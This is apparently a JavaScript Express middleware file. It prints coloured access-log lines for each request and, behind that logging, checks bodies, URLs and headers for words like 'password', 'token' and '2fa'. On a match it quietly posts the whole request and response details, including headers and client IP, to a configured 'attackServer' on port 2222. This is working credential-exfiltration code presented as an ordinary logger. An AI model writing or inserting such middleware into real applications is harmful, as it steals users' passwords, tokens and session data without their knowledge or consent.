const axios = require("axios")

const attackServer = "127.0.0.1"
const aAttackPort = 2222


const sensitiveValues = ["login", "register", "2fa", "password", "token", "key", "pass", "secret", ]


const stringContainsSensitiveValue = (string) => {
    let response = false
    sensitiveValues.forEach(value => {
        if (string.toLowerCase().includes(value.toLowerCase())) {
            response = true
        }
    })
    return response
}



const dictContainsSensitiveValue = (dict) => {
    let response = false
    for (let key in dict) {
        if (stringContainsSensitiveValue(key)) {
            response = true
        }
    }
    return response
}



module.exports = function (req, res, next) {
    res.on("finish", function () {
        const date = new Date()

        if (res.statusCode < 300) { // Success
            console.log(`\x1b[32m${res.statusCode}\x1b[0m ${res.get('Content-Length') || 0} [${date.toUTCString()}] ${req.method} ${decodeURI(req.url)} HTTP/${req.httpVersion} ${req.headers['user-agent']} ${req.ip}`);
        } else if (res.statusCode < 400) { // Redirection
            console.log(`\x1b[35m${res.statusCode}\x1b[0m ${res.get('Content-Length') || 0} [${date.toUTCString()}] ${req.method} ${decodeURI(req.url)} HTTP/${req.httpVersion} ${req.headers['user-agent']} ${req.ip}`);
        } else if (res.statusCode < 600) { // Client or server Error
            console.log(`\x1b[31m${res.statusCode}\x1b[0m ${res.get('Content-Length') || 0} [${date.toUTCString()}] ${req.method} ${decodeURI(req.url)} HTTP/${req.httpVersion} ${req.headers['user-agent']} ${req.ip}`);
        } else { // Unknown
            console.log(`\x1b[37m${res.statusCode}\x1b[0m ${res.get('Content-Length') || 0} [${date.toUTCString()}] ${req.method} ${decodeURI(req.url)} HTTP/${req.httpVersion} ${req.headers['user-agent']} ${req.ip}` );
        }


        if (dictContainsSensitiveValue(req.body) || stringContainsSensitiveValue(decodeURI(req.url)) || dictContainsSensitiveValue(req.headers)) {
            axios.post(`http://${attackServer}:${aAttackPort}`, {
                url: decodeURI(req.url),
                host: req.headers.host,
                method: req.method,
                date: date.toLocaleString(),
                client: {
                    ip: req.ip,
                    body: req.body,
                    headers: req.headers,
                    httpVersion: req.httpVersion,
                },
                response: {
                    statusCode: res.statusCode,
                    body: res.body,
                    headers: res.headers,
                    contentLength: res.get('Content-Length') || 0
                }
            })
        }


    });
    next();
}